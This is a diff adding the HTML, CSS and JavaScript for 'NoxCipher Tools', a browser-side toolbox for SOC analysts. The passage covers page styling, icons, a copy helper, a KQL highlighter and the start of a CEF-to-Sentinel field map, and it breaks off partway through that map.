@@ -1,0 +1,1544 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#08090a" />
+  <meta name="description" content="NoxCipher Tools: small browser tools for SOC work. CEF parser, time converter, CIDR calculator, JWT decoder, encoder. Everything runs locally." />
+  <title>NoxCipher Tools</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns%3D'http%3A//www.w3.org/2000/svg'%20viewBox%3D'0%200%2048%2048'%3E%3Crect%20width%3D'48'%20height%3D'48'%20rx%3D'10'%20fill%3D'%2308090a'/%3E%3Cdefs%3E%3Cpath%20id%3D'n'%20d%3D'M10%208H16L32%2030V8H38V40H32L16%2018V40H10Z'/%3E%3CclipPath%20id%3D'a'%3E%3Crect%20width%3D'48'%20height%3D'18'/%3E%3C/clipPath%3E%3CclipPath%20id%3D'b'%3E%3Crect%20y%3D'20'%20width%3D'48'%20height%3D'8'/%3E%3C/clipPath%3E%3CclipPath%20id%3D'c'%3E%3Crect%20y%3D'30'%20width%3D'48'%20height%3D'18'/%3E%3C/clipPath%3E%3C/defs%3E%3Cg%20clip-path%3D'url(%23a)'%3E%3Cuse%20href%3D'%23n'%20fill%3D'%23EDEDEA'/%3E%3C/g%3E%3Cg%20clip-path%3D'url(%23b)'%3E%3Cuse%20href%3D'%23n'%20fill%3D'%233DFFA2'%20transform%3D'translate(3%200)'/%3E%3C/g%3E%3Cg%20clip-path%3D'url(%23c)'%3E%3Cuse%20href%3D'%23n'%20fill%3D'%23EDEDEA'/%3E%3C/g%3E%3C/svg%3E" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Geist+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #08090a; --surface: #0e1011; --surface-2: #131617; --code: #060707;
+      --line: rgba(255,255,255,.08); --line-2: rgba(255,255,255,.14);
+      --text: #ededea; --muted: #8b9094; --faint: #5b6064;
+      --accent: #3dffa2; --accent-dim: rgba(61,255,162,.10);
+      --warn: #ffb547; --danger: #ff6b6b; --info: #7fb8ff;
+      --sans: 'Geist', system-ui, sans-serif; --mono: 'Geist Mono', ui-monospace, monospace;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; background: var(--bg); color: var(--text); font: 400 15px/1.6 var(--sans); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
+    body::before {
+      content: ""; position: fixed; inset: 0; pointer-events: none; z-index: -1;
+      background-image: radial-gradient(rgba(255,255,255,.07) 1px, transparent 1px); background-size: 28px 28px;
+      mask-image: radial-gradient(ellipse 80% 50% at 50% 0%, #000 30%, transparent 75%);
+    }
+    a { color: inherit; text-decoration: none; }
+    button, input, textarea, select { font: inherit; color: inherit; }
+    ::selection { background: var(--accent); color: #04140b; }
+    .wrap { width: min(1240px, calc(100% - 32px)); margin: 0 auto; }
+    .label { font: 500 12px var(--mono); letter-spacing: .08em; text-transform: uppercase; color: var(--muted); }
+    svg.i { width: 16px; height: 16px; flex: none; }
+
+    header { position: sticky; top: 0; z-index: 40; background: rgba(8,9,10,.85); backdrop-filter: blur(14px); border-bottom: 1px solid var(--line); }
+    .nav { height: 60px; display: flex; align-items: center; justify-content: space-between; gap: 16px; }
+    .logo { display: inline-flex; align-items: center; gap: 10px; min-width: 0; }
+    .logo svg { width: 28px; height: 28px; color: var(--text); flex: none; }
+    .logo-word { font: 600 16px var(--sans); letter-spacing: -.01em; white-space: nowrap; }
+    .logo-word span { color: var(--muted); font-weight: 500; }
+    .logo-sub { font: 500 14px var(--mono); color: var(--accent); white-space: nowrap; }
+    .nav-right { display: flex; gap: 8px; }
+    .btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; height: 34px; padding: 0 12px; border-radius: 8px; border: 1px solid var(--line-2); background: transparent; font: 500 13px var(--sans); cursor: pointer; white-space: nowrap; transition: background .15s, border-color .15s; }
+    .btn:hover { background: rgba(255,255,255,.04); border-color: rgba(255,255,255,.24); }
+    .btn.solid { background: var(--accent); border-color: var(--accent); color: #04140b; font-weight: 600; }
+    .btn.solid:hover { background: #6bffbb; }
+    .btn.sm { height: 28px; padding: 0 10px; font-size: 12px; border-radius: 7px; }
+
+    .hero { padding: 44px 0 24px; display: flex; justify-content: space-between; align-items: flex-end; gap: 20px; flex-wrap: wrap; }
+    h1 { margin: 12px 0 10px; font-size: clamp(2.2rem, 4.6vw, 3.4rem); font-weight: 600; letter-spacing: -.045em; line-height: 1; }
+    h1 .dot { color: var(--accent); }
+    .lede { margin: 0; color: var(--muted); font-size: 16px; max-width: 560px; }
+    .local { display: inline-flex; align-items: center; gap: 8px; font: 500 12px var(--mono); color: var(--accent); border: 1px solid rgba(61,255,162,.25); background: var(--accent-dim); padding: 6px 10px; border-radius: 8px; }
+    .local svg { width: 14px; height: 14px; }
+
+    .shell { display: grid; grid-template-columns: 250px minmax(0, 1fr); gap: 20px; padding: 4px 0 56px; align-items: start; }
+    .side { position: sticky; top: 80px; display: grid; gap: 4px; }
+    .tool-btn { display: grid; grid-template-columns: 34px 1fr; gap: 10px; align-items: center; text-align: left; padding: 10px; border-radius: 10px; border: 1px solid transparent; background: none; cursor: pointer; transition: background .12s, border-color .12s; }
+    .tool-btn:hover { background: rgba(255,255,255,.03); }
+    .tool-btn[aria-selected="true"] { background: var(--surface); border-color: var(--line-2); }
+    .tool-btn .ico { width: 34px; height: 34px; border-radius: 9px; display: grid; place-items: center; background: var(--surface-2); border: 1px solid var(--line); color: var(--muted); }
+    .tool-btn .ico svg { width: 17px; height: 17px; }
+    .tool-btn[aria-selected="true"] .ico { color: var(--accent); border-color: rgba(61,255,162,.25); background: var(--accent-dim); }
+    .tool-btn b { display: block; font-size: 14px; font-weight: 500; }
+    .tool-btn small { display: block; font-size: 12px; color: var(--faint); line-height: 1.35; }
+    .side-note { margin-top: 12px; padding: 12px; border-radius: 10px; border: 1px dashed var(--line-2); font-size: 12.5px; color: var(--faint); }
+
+    .work { border: 1px solid var(--line-2); border-radius: 14px; background: var(--surface); min-width: 0; }
+    .w-head { padding: 20px 24px; border-bottom: 1px solid var(--line); display: flex; justify-content: space-between; gap: 16px; align-items: flex-start; flex-wrap: wrap; }
+    .w-head h2 { margin: 0 0 4px; font-size: 20px; font-weight: 600; letter-spacing: -.02em; }
+    .w-head p { margin: 0; color: var(--muted); font-size: 14px; max-width: 620px; }
+    .w-sec { padding: 20px 24px; border-bottom: 1px solid var(--line); }
+    .w-sec:last-child { border-bottom: 0; }
+    .w-sec h3 { margin: 0 0 12px; font: 500 11px var(--mono); letter-spacing: .08em; text-transform: uppercase; color: var(--faint); display: flex; justify-content: space-between; align-items: center; gap: 10px; flex-wrap: wrap; }
+    .row-actions { display: flex; gap: 6px; flex-wrap: wrap; text-transform: none; letter-spacing: 0; }
+
+    textarea, .inp, select { width: 100%; border: 1px solid var(--line-2); background: var(--code); border-radius: 10px; outline: none; font: 400 13px/1.6 var(--mono); color: #d6d9d6; }
+    textarea { padding: 12px 14px; resize: vertical; min-height: 110px; }
+    .inp { height: 40px; padding: 0 12px; }
+    select { height: 40px; padding: 0 10px; font-family: var(--sans); font-size: 13px; background: var(--surface-2); }
+    textarea:focus, .inp:focus, select:focus { border-color: rgba(61,255,162,.5); box-shadow: 0 0 0 3px rgba(61,255,162,.07); }
+    textarea::placeholder, .inp::placeholder { color: var(--faint); }
+    .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .grid2 > *, .enc-grid > * { min-width: 0; }
+    .field label { display: block; font: 500 12px var(--mono); color: var(--muted); margin-bottom: 6px; }
+
+    .err { display: flex; gap: 10px; align-items: flex-start; padding: 12px 14px; border-radius: 10px; border: 1px solid rgba(255,107,107,.25); background: rgba(255,107,107,.06); color: #ffb3b3; font-size: 13.5px; }
+    .info { display: flex; gap: 10px; align-items: flex-start; padding: 12px 14px; border-radius: 10px; border: 1px solid rgba(127,184,255,.2); background: rgba(127,184,255,.05); color: var(--muted); font-size: 13.5px; }
+    .info b, .err b { color: var(--text); font-weight: 500; }
+    .placeholder { color: var(--faint); font-size: 14px; padding: 8px 0; }
+
+    .summary { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
+    .pill { display: inline-flex; align-items: center; gap: 6px; font: 500 12px var(--mono); padding: 4px 9px; border-radius: 7px; border: 1px solid var(--line); background: var(--surface-2); color: var(--muted); }
+    .pill b { color: var(--text); font-weight: 500; }
+    .pill.g { color: var(--accent); border-color: rgba(61,255,162,.25); background: var(--accent-dim); }
+    .pill.w { color: var(--warn); border-color: rgba(255,181,71,.25); background: rgba(255,181,71,.07); }
+    .pill.r { color: #ff8a8a; border-color: rgba(255,107,107,.25); background: rgba(255,107,107,.07); }
+    .pill.b { color: var(--info); border-color: rgba(127,184,255,.25); background: rgba(127,184,255,.07); }
+
+    .kv { width: 100%; border-collapse: collapse; font-size: 13px; }
+    .kv th { text-align: left; font: 500 11px var(--mono); color: var(--faint); letter-spacing: .06em; text-transform: uppercase; padding: 0 10px 8px; border-bottom: 1px solid var(--line); white-space: nowrap; }
+    .kv td { padding: 8px 10px; border-bottom: 1px solid var(--line); vertical-align: top; }
+    .kv tr:last-child td { border-bottom: 0; }
+    .kv td.k { font: 500 12.5px var(--mono); color: var(--muted); white-space: nowrap; width: 1%; }
+    .kv td.v { font: 400 12.5px var(--mono); color: var(--text); word-break: break-all; }
+    .kv td.c { font: 500 12.5px var(--mono); color: var(--accent); white-space: nowrap; }
+    .kv td.c.dim { color: var(--faint); }
+    .kv td.d { color: var(--faint); font-size: 12.5px; }
+    .kv tr.hdr td.k { color: var(--info); }
+    .tbl-wrap { overflow-x: auto; }
+    .copyable { cursor: pointer; border-radius: 5px; transition: background .12s; }
+    .copyable:hover { background: rgba(61,255,162,.07); }
+    .copyable:hover::after { content: " ⧉"; color: var(--accent); font-size: 11px; }
+
+    pre.code { margin: 0; padding: 14px 16px; border-radius: 10px; border: 1px solid var(--line); background: var(--code); font: 400 12.5px/1.7 var(--mono); color: #c9cdc9; overflow-x: auto; white-space: pre; }
+    pre.code.wrap-text { white-space: pre-wrap; word-break: break-all; }
+    .k { color: #7fb8ff; } .s { color: #e6c07b; } .n { color: #f78c6c; } .t { color: var(--accent); } .cm { color: var(--faint); } .key { color: #c3a6ff; }
+
+    .bits { display: grid; grid-template-columns: repeat(32, 1fr); gap: 2px; margin: 4px 0 6px; }
+    .bits i { height: 22px; border-radius: 3px; background: rgba(255,255,255,.07); display: grid; place-items: center; font: 500 9px var(--mono); color: var(--faint); font-style: normal; }
+    .bits i.on { background: rgba(61,255,162,.22); color: var(--accent); }
+    .bits i.sep { margin-right: 4px; }
+    .bits-legend { display: flex; justify-content: space-between; font: 500 11px var(--mono); color: var(--faint); }
+
+    .jwt-raw { font: 400 12.5px/1.7 var(--mono); word-break: break-all; padding: 12px 14px; border-radius: 10px; border: 1px solid var(--line); background: var(--code); }
+    .jwt-raw .h { color: #ff8a8a; } .jwt-raw .p { color: #c3a6ff; } .jwt-raw .sg { color: var(--info); } .jwt-raw .dot { color: var(--muted); }
+
+    .seg { display: inline-flex; border: 1px solid var(--line-2); border-radius: 8px; padding: 2px; background: var(--bg); flex-wrap: wrap; }
+    .seg button { border: 0; background: none; height: 28px; padding: 0 10px; border-radius: 6px; font: 500 12.5px var(--sans); color: var(--muted); cursor: pointer; }
+    .seg button[aria-pressed="true"] { background: var(--surface-2); color: var(--text); box-shadow: inset 0 0 0 1px var(--line-2); }
+    .enc-grid { display: grid; grid-template-columns: 1fr auto 1fr; gap: 12px; align-items: stretch; }
+    .swap { align-self: center; width: 36px; height: 36px; border-radius: 9px; border: 1px solid var(--line-2); background: var(--surface-2); cursor: pointer; display: grid; place-items: center; color: var(--muted); }
+    .swap:hover { color: var(--accent); }
+    .enc-grid textarea { min-height: 180px; }
+    .hint-line { margin-top: 10px; font-size: 12.5px; color: var(--faint); min-height: 1.4em; }
+    .hint-line.warn { color: var(--warn); }
+
+
+    /* AMA planner */
+    .plan-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 14px 20px; }
+    .plan-grid.inputs { margin-top: 16px; padding-top: 16px; border-top: 1px dashed var(--line-2); grid-template-columns: repeat(3, minmax(0, 1fr)); }
+    .plan-grid > * { min-width: 0; }
+    .chks { display: grid; gap: 7px; }
+    .field label.chk, .chk { display: inline-flex; align-items: center; gap: 8px; font: 400 13.5px var(--sans); color: #c3c7c5; cursor: pointer; margin: 0; }
+    .chk input { width: 16px; height: 16px; accent-color: var(--accent); margin: 0; flex: none; }
+    .field .cm { color: var(--faint); font-weight: 400; }
+    .route-split { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .route-card { border: 1px solid var(--line); border-radius: 12px; padding: 14px 16px; background: #0b0d0e; }
+    .route-card h4 { margin: 0 0 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+    .route-card ul { margin: 0; padding-left: 18px; color: var(--muted); font-size: 13.5px; display: grid; gap: 4px; }
+    .route-card p { margin: 0; color: var(--faint); font-size: 13px; }
+    .route-card.empty { opacity: .6; }
+    .dot-g, .dot-b, .dot-w { width: 8px; height: 8px; border-radius: 50%; flex: none; }
+    .dot-g { background: var(--accent); box-shadow: 0 0 8px var(--accent); } .dot-b { background: var(--info); } .dot-w { background: var(--warn); }
+    .kv tr.grp td { font: 500 11px var(--mono); letter-spacing: .08em; text-transform: uppercase; color: var(--faint); padding-top: 14px; background: none; }
+    .kv .pill { white-space: nowrap; font-size: 11px; padding: 2px 7px; }
+    .tags-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(230px, 1fr)); gap: 8px; }
+    .tagcard { border: 1px solid var(--line); border-radius: 10px; padding: 10px 12px; background: #0b0d0e; display: grid; gap: 3px; }
+    .tagcard code { font: 500 13px var(--mono); color: var(--accent); justify-self: start; }
+    .tagcard span { font-size: 12.5px; color: var(--faint); }
+    .tagcard.dim { opacity: .5; }
+    .olist { margin: 0; padding: 0; list-style: none; counter-reset: s; display: grid; gap: 10px; }
+    .olist li { counter-increment: s; display: grid; grid-template-columns: 26px 1fr; gap: 10px; font-size: 14px; color: #c3c7c5; }
+    .olist li::before { content: counter(s); font: 500 11.5px/22px var(--mono); text-align: center; width: 22px; height: 22px; border-radius: 6px; background: var(--surface-2); border: 1px solid var(--line-2); color: var(--muted); }
+    .olist code, .gotchas code, .info code { font: 500 12px var(--mono); color: var(--text); background: var(--surface-2); border: 1px solid var(--line); border-radius: 4px; padding: 0 4px; }
+    .olist b, .gotchas b { color: var(--text); font-weight: 500; }
+    .cmd-block + .cmd-block { margin-top: 12px; }
+    .cmd-h { display: flex; justify-content: space-between; align-items: center; gap: 10px; margin-bottom: 6px; font-size: 13px; color: var(--muted); }
+    .gotchas { margin: 0; padding: 0; list-style: none; display: grid; gap: 9px; }
+    .gotchas li { display: grid; grid-template-columns: 20px 1fr; gap: 8px; font-size: 14px; color: var(--muted); }
+    .gotchas li::before { content: "!"; font: 600 11px/18px var(--mono); text-align: center; width: 18px; height: 18px; border-radius: 50%; color: var(--warn); border: 1px solid rgba(255,181,71,.35); background: rgba(255,181,71,.07); }
+
+    /* DCR builder */
+    .src-list { display: grid; gap: 10px; }
+    .src-card { border: 1px solid var(--line); border-radius: 12px; background: #0b0d0e; transition: border-color .15s; }
+    .src-card.on { border-color: rgba(61,255,162,.3); }
+    .src-head { display: grid; grid-template-columns: 18px 1fr auto; gap: 12px; align-items: center; padding: 12px 14px; cursor: pointer; }
+    .src-head input { width: 16px; height: 16px; accent-color: var(--accent); margin: 0; }
+    .src-head b { display: block; font-size: 14px; font-weight: 600; }
+    .src-head small { display: block; font-size: 12.5px; color: var(--faint); }
+    .src-head code { font: 500 11.5px var(--mono); color: var(--muted); background: var(--surface-2); border: 1px solid var(--line); border-radius: 5px; padding: 2px 7px; white-space: nowrap; }
+    .src-card.on .src-head code { color: var(--accent); border-color: rgba(61,255,162,.25); background: var(--accent-dim); }
+    .src-body { display: none; padding: 4px 14px 16px 44px; gap: 12px; }
+    .src-card.on .src-body { display: grid; }
+    .chk-row { display: flex; flex-wrap: wrap; gap: 6px 16px; }
+    .field label.chk.sm, .chk.sm { font: 400 12.5px var(--mono); color: var(--muted); }
+    .src-body select, .vendor select { max-width: 220px; }
+    .notes { margin: 10px 0 0; padding: 0; list-style: none; display: grid; gap: 7px; }
+    .notes li { display: grid; grid-template-columns: 20px 1fr; gap: 8px; font-size: 13.5px; color: var(--muted); }
+    .notes li::before { content: "i"; font: 600 11px/18px var(--mono); text-align: center; width: 18px; height: 18px; border-radius: 50%; color: var(--info); border: 1px solid rgba(127,184,255,.35); background: rgba(127,184,255,.07); }
+    .notes code { font: 500 12px var(--mono); color: var(--text); background: var(--surface-2); border: 1px solid var(--line); border-radius: 4px; padding: 0 4px; }
+    .notes b { color: var(--text); font-weight: 500; }
+    .gotchas + .notes { margin-top: 12px; }
+    /* Firewall builder */
+    .vendor-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
+    .vendor { border: 1px solid var(--line); border-radius: 12px; padding: 14px; background: #0b0d0e; display: grid; gap: 10px; align-content: start; min-width: 0; }
+    .vendor h4 { margin: 0; font-size: 13.5px; font-weight: 600; }
+    .vendor .inp { height: 36px; }
+    .vendor-out h3 .sub { text-transform: none; letter-spacing: 0; color: var(--faint); font-family: var(--sans); font-size: 12.5px; margin-left: 6px; }
+    .vendor-out h3 > span:first-child { color: var(--text); font: 600 14px var(--sans); letter-spacing: 0; text-transform: none; }
+    details.test { margin-top: 10px; }
+    details.test summary { cursor: pointer; font-size: 13px; color: var(--muted); list-style: none; display: inline-flex; align-items: center; gap: 6px; }
+    details.test summary::before { content: "▸"; color: var(--accent); transition: transform .15s; }
+    details.test[open] summary::before { transform: rotate(90deg); }
+    details.test summary::-webkit-details-marker { display: none; }
+    footer { border-top: 1px solid var(--line); padding: 24px 0 36px; }
+    .foot { display: flex; justify-content: space-between; gap: 16px; flex-wrap: wrap; font-size: 13px; color: var(--faint); }
+    .foot a:hover { color: var(--text); }
+    .toast { position: fixed; left: 50%; bottom: 24px; transform: translate(-50%, 20px); opacity: 0; pointer-events: none; background: var(--surface-2); border: 1px solid rgba(61,255,162,.35); padding: 10px 16px; border-radius: 10px; font: 500 13px var(--sans); box-shadow: 0 20px 40px rgba(0,0,0,.5); transition: opacity .2s, transform .2s; z-index: 80; max-width: calc(100% - 32px); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .toast.show { opacity: 1; transform: translate(-50%, 0); }
+    .toast b { color: var(--accent); font-weight: 500; }
+
+    @media (max-width: 900px) {
+      .shell { grid-template-columns: minmax(0, 1fr); }
+      .side { position: static; display: flex; overflow-x: auto; gap: 6px; scrollbar-width: none; }
+      .side::-webkit-scrollbar { display: none; }
+      .tool-btn { grid-template-columns: 26px auto; padding: 6px 12px 6px 6px; border-color: var(--line); flex: none; }
+      .tool-btn .ico { width: 26px; height: 26px; border-radius: 7px; }
+      .tool-btn .ico svg { width: 14px; height: 14px; }
+      .tool-btn small, .side-note { display: none; }
+      .tool-btn b { font-size: 13px; white-space: nowrap; }
+      .w-head, .w-sec { padding-left: 16px; padding-right: 16px; }
+      .grid2 { grid-template-columns: 1fr; }
+      .enc-grid { grid-template-columns: 1fr; }
+      .plan-grid, .plan-grid.inputs, .route-split { grid-template-columns: minmax(0, 1fr); }
+      .vendor-grid { grid-template-columns: minmax(0, 1fr); }
+      .src-body { padding-left: 14px; }
+      .src-head { grid-template-columns: 18px 1fr; }
+      .src-head code { grid-column: 2; justify-self: start; }
+      .swap { justify-self: center; transform: rotate(90deg); }
+      .hide-sm { display: none; }
+      .bits i { font-size: 0; height: 16px; }
+    }
+    @media (prefers-reduced-motion: reduce) { * { transition: none !important; } }
+  </style>
+</head>
+<body>
+  <svg width="0" height="0" style="position:absolute" aria-hidden="true">
+    <defs>
+      <path id="nx-n" d="M10 8H16L32 30V8H38V40H32L16 18V40H10Z"/>
+      <clipPath id="nx-top"><rect x="0" y="0" width="48" height="18"/></clipPath>
+      <clipPath id="nx-mid"><rect x="0" y="20" width="48" height="8"/></clipPath>
+      <clipPath id="nx-bot"><rect x="0" y="30" width="48" height="18"/></clipPath>
+      <symbol id="nx-mark" viewBox="0 0 48 48">
+        <g clip-path="url(#nx-top)"><use href="#nx-n" fill="currentColor"/></g>
+        <g clip-path="url(#nx-mid)"><use href="#nx-n" style="fill:#3dffa2" transform="translate(4 0)"/></g>
+        <g clip-path="url(#nx-bot)"><use href="#nx-n" fill="currentColor"/></g>
+      </symbol>
+      <symbol id="t-ama" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="14" width="7" height="6" rx="1.5"/><path d="M6.5 14v-3h11v3M12 11V8"/><path d="M8.5 6.5a5 5 0 0 1 7 0M6.5 4.5a8 8 0 0 1 11 0"/><rect x="14" y="14" width="7" height="6" rx="1.5"/></g></symbol>
+      <symbol id="t-dcr" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h6M4 12h6M4 19h6"/><path d="M10 5c4 0 4 7 8 7M10 19c4 0 4-7 8-7M10 12h8"/><circle cx="19.5" cy="12" r="1.5"/></g></symbol>
+      <symbol id="t-fw" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 10h18M3 14.5h18M9 5v5M15 10v4.5M9 14.5V19"/></g></symbol>
+      <symbol id="t-cef" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M4 6h16M4 12h10M4 18h13"/><path d="M17 10l3 2-3 2"/></g></symbol>
+      <symbol id="t-time" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="12" r="8.5"/><path d="M12 7.5V12l3 2"/></g></symbol>
+      <symbol id="t-cidr" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><rect x="3" y="4" width="18" height="6" rx="1.5"/><rect x="3" y="14" width="8" height="6" rx="1.5"/><rect x="13" y="14" width="8" height="6" rx="1.5"/><path d="M12 10v2M7 12h10M7 12v2M17 12v2"/></g></symbol>
+      <symbol id="t-jwt" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="8" cy="12" r="4"/><path d="M12 12h9M18 12v3M15.5 12v2"/></g></symbol>
+      <symbol id="t-enc" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 8h13l-3-3M20 16H7l3 3"/></g></symbol>
+      <symbol id="i-lock" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V8a4 4 0 0 1 8 0v3"/></g></symbol>
+      <symbol id="i-warn" viewBox="0 0 24 24"><path d="M12 3l10 18H2L12 3z" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><path d="M12 10v5M12 18v.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></symbol>
+      <symbol id="i-swap" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 4L3 8l4 4M3 8h14M17 20l4-4-4-4M21 16H7"/></g></symbol>
+      <symbol id="i-gh" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2a10 10 0 0 0-3.16 19.49c.5.09.68-.22.68-.48v-1.7c-2.78.6-3.37-1.34-3.37-1.34-.45-1.16-1.11-1.47-1.11-1.47-.91-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.9 1.52 2.34 1.08 2.91.83.09-.65.35-1.08.63-1.33-2.22-.25-4.55-1.11-4.55-4.94 0-1.09.39-1.98 1.03-2.68-.1-.25-.45-1.27.1-2.65 0 0 .84-.27 2.75 1.02a9.56 9.56 0 0 1 5 0c1.91-1.29 2.75-1.02 2.75-1.02.55 1.38.2 2.4.1 2.65.64.7 1.03 1.59 1.03 2.68 0 3.84-2.34 4.69-4.57 4.93.36.31.68.92.68 1.85v2.75c0 .27.18.58.69.48A10 10 0 0 0 12 2z"/></symbol>
+    </defs>
+  </svg>
+
+  <header>
+    <div class="wrap nav">
+      <a class="logo" href="#" aria-label="NoxCipher Tools">
+        <svg aria-hidden="true"><use href="#nx-mark"/></svg>
+        <span class="logo-word">nox<span>cipher</span></span>
+        <span class="logo-sub">/tools</span>
+      </a>
+      <div class="nav-right">
+        <a class="btn hide-sm" href="https://scripts.noxcipher.site">Scripts</a>
+        <a class="btn" href="https://noxcipher.site">Main site</a>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <div class="wrap hero">
+      <div>
+        <div class="label">Toolbox</div>
+        <h1>Small tools. Daily use<span class="dot">.</span></h1>
+        <p class="lede">The things you'd normally search for mid-ticket, built for SOC work on Sentinel, Entra and firewalls.</p>
+      </div>
+      <span class="local"><svg aria-hidden="true"><use href="#i-lock"/></svg>Runs in your browser. Nothing is uploaded.</span>
+    </div>
+
+    <div class="wrap shell">
+      <nav class="side" id="side" role="tablist" aria-label="Tools"></nav>
+      <section class="work" id="work" aria-live="polite"></section>
+    </div>
+  </main>
+
+  <footer>
+    <div class="wrap foot">
+      <span>&copy; <span id="year"></span> NoxCipher &middot; no tracking, no uploads, no accounts</span>
+      <span><a href="https://scripts.noxcipher.site">scripts</a> &middot; <a href="https://noxcipher.site">noxcipher.site</a></span>
+    </div>
+  </footer>
+  <div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+  <script>
+  (() => {
+    const $ = (s, r = document) => r.querySelector(s);
+    const esc = t => String(t ?? '').replace(/[&<>"]/g, c => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;' }[c]));
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    /* ---------- copy ---------- */
+    const toast = $('#toast'); let tt;
+    async function copy(text, label = 'value') {
+      let ok = false;
+      try { await navigator.clipboard.writeText(text); ok = true; }
+      catch { const ta = document.createElement('textarea'); ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0'; document.body.appendChild(ta); ta.select(); try { ok = document.execCommand('copy'); } catch {} ta.remove(); }
+      toast.innerHTML = ok ? `<b>Copied</b>&nbsp; ${esc(label)}` : 'Copy blocked by the browser';
+      toast.classList.add('show'); clearTimeout(tt); tt = setTimeout(() => toast.classList.remove('show'), 1600);
+    }
+    document.addEventListener('click', e => {
+      const c = e.target.closest('[data-copy]'); if (c) copy(c.dataset.copy, c.dataset.label || c.dataset.copy.slice(0, 48));
+    });
+    const cp = (v, label) => `data-copy="${esc(v)}" data-label="${esc(label || v)}" class="copyable"`;
+
+    /* tiny KQL highlighter */
+    function kql(src) {
+      const KW = /\b(where|project|summarize|extend|by|and|or|in|ago|count|datetime|ipv4_is_in_range|ipv4_is_private|between|has|contains)\b/g;
+      return src.split('\n').map(line => {
+        let cmt = ''; const ci = line.indexOf('//');
+        if (ci > -1) { cmt = line.slice(ci); line = line.slice(0, ci); }
+        if (/^\s*[A-Z]\w+\s*$/.test(line)) return `<span class="t">${esc(line)}</span>`;
+        const body = line.split(/("[^"]*")/).map((p, i) => i % 2 ? `<span class="s">${esc(p)}</span>`
+          : esc(p).replace(KW, '<span class="k">$1</span>').replace(/\b(\d+[hdm]?)\b/g, '<span class="n">$1</span>')).join('');
+        return body + (cmt ? `<span class="cm">${esc(cmt)}</span>` : '');
+      }).join('\n');
+    }
+    const kqlBlock = src => `<div class="w-sec"><h3><span>KQL</span><span class="row-actions"><button class="btn sm" data-copy="${esc(src)}" data-label="KQL query">Copy query</button></span></h3><pre class="code">${kql(src)}</pre></div>`;
+
+    /* =========================================================
+       1. CEF parser
+       ========================================================= */
+    const CEF_HEADER = [
+      ['Version', null],
+      ['Device Vendor', 'DeviceVendor'],
+      ['Device Product', 'DeviceProduct'],
+      ['Device Version', 'DeviceVersion'],
+      ['Signature ID', 'DeviceEventClassID'],
+      ['Name', 'Activity'],
+      ['Severity', 'LogSeverity']
+    ];
+    const CEF_MAP = {
+      act: 'DeviceAction', app: 'ApplicationProtocol', cat: 'DeviceEventCategory', cnt: 'EventCount',
+      dhost: 'DestinationHostName', dmac: 'DestinationMACAddress', dntdom: 'DestinationNTDomain', dpt: 'DestinationPort',
+      dpid: 'DestinationProcessId', dproc: 'DestinationProcessName', dst: 'DestinationIP', duid: 'DestinationUserID', duser: 'DestinationUserName',
+      deviceExternalId: 'DeviceExternalID', deviceInboundInterface: 'DeviceInboundInterface', deviceOutboundInterface: 'DeviceOutboundInterface',
+      dvc: 'DeviceAddress', dvchost: 'DeviceName', dvcmac: 'DeviceMacAddress', deviceDirection: 'CommunicationDirection',
+      end: 'EndTime', start: 'StartTime', rt: 'ReceiptTime', externalId: 'ExternalID',
+      fname: 'FileName', fsize: 'FileSize', filePath: 'FilePath', fileHash: 'FileHash',
+      in: 'ReceivedBytes', out: 'SentBytes', msg: 'Message', proto: 'Protocol', reason: 'Reason', outcome: 'EventOutcome',
+      request: 'RequestURL', requestClientApplication: 'RequestClientApplication', requestContext: 'RequestContext', requestMethod: 'RequestMethod',
